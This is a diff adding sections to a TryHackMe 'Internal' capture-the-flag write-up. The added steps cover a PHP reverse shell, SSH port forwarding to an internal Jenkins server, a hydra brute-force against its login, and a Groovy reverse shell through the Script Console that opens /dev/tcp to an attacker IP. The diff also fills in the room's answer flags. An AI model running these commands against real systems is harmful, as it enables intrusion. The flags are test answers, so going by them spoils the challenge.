@@ -75,6 +75,9 @@ After looking around for a while and looking for ways to upload shells, I switch
 Let's keep this to the side for now, I tried the credentials on the phpmyadmin page that was found earlier and SSH but no luck.<br />
 <br />
 
+
+## Uploading a reverse shell
+
 After changing to the last theme "Twenty Twenty" I couldn't find any more information, so I decided to try uploading a shell. AttackBoxes on THM come with shells already installed. Let's edit and upload one. <br />
 ```shell
 mv /usr/share/webshells/php/php-reverse-shell.php shell.php
@@ -105,14 +108,96 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT13.png?raw=true)<br />
 Great, let's have a look around the system for the user flag. <br />
 
+## System Enumeration
+
+After looking around for a long time without luck I finally found something interesting looking through all of the text files...<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT14.png?raw=true)<br />
+Some details for another user! Let's get on that account and try to escalate our privileges further.<br />
+```shell
+su aubreanna
+```
+Awesome! Let's get the user flag and then find a way to get the root flag!<br />
+```shell
+cd /home/aubreanna
+cat user.txt
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT15.png?raw=true)<br />
+
+There was another interesting file in aubreannas home folder, let's have a look at it. <br />
+```
+cat jenkins.txt
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT16.png?raw=true)<br />
+There's an internal Jenkins server running, let's use our AttackBox machine and use SSH to forward Jenkins IP:Port to our AttackBox.<br />
+```shell
+ssh -L 9999:172.17.0.2:8080 aubreanna@internal.thm
+```
+Now let's head over to our web browser and visit the following URL<br />
+```shell
+http://localhost:9999/
+```
+After trying all of the logins I had gathered, nothing worked so I decided to try bruteforcing the login.<br />
+
+
+## Bruteforcing Login
+
+First we'll need to capture the request of the login with Burp Suite. <br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT16.png?raw=true)<br />
+Now let's fire up hydra and try bruteforcing the password for the admin account.<br />
+```shell
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 9999 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password'
+```
+After a little while, we finally crack the password! Let's use it to login.<br />
+<br />
+
+## Getting a remote shell on Jenkins.
+
+Select "Manage Jenkins" on the left of the webpage. Scroll down until you find "Script Console"
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT27.png?raw=true)<br />
+Now we need to add the commands we want it to execute, let's create a reverse shell. Paste the code below into the command textbox and then click the blue button "Run"<br />
+```shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.153.77/9500;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT28.png?raw=true)<br />
+Before executing the commands, we need to set up a listener on our AttackBox.<br />
+```shell
+rlwrap nc -nlvp 9500
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT23.png?raw=true)<br />
+Okay now we're all setup let's run it, click the blue "Run" button.<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT29.png?raw=true)<br />
+Success! Let's have a look around and see if we can find the root flag.
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT30.png?raw=true)<br />
+Permission denied still... Damn let's look for another way around it. While checking ways to escalate my privileges I thought I'd check the ```/opt``` directory in-case there's credentials inside the folder again.
+```
+cd /opt
+ls
+cat note.txt
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT31.png?raw=true)<br />
+Root access! Let's get that root flag.<br />
+<br />
+
+Now that we have the root login, let's go back to our other reverse shell that we had open on the user aubreanna and try the root credentials. <br />
+```shell
+su root
+cd /root
+ls
+cat root.txt
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Internal/screenshots/SCREENSHOT32.png?raw=true)<br />
+Finally! This one was long.
+
 
 ## Questions & Answers
 
 Question 1:<br />
-**What is the user flag?** <br />
+**What is the user flag?** THM{int3rna1_fl4g_1}<br />
 
 Question 2:<br />
-**What is the root flag?** <br />
+**What is the root flag?** THM{d0ck3r_d3str0y3r}<br />
 
 ### Farewell, I hope you all enjoyed this write-up!
 
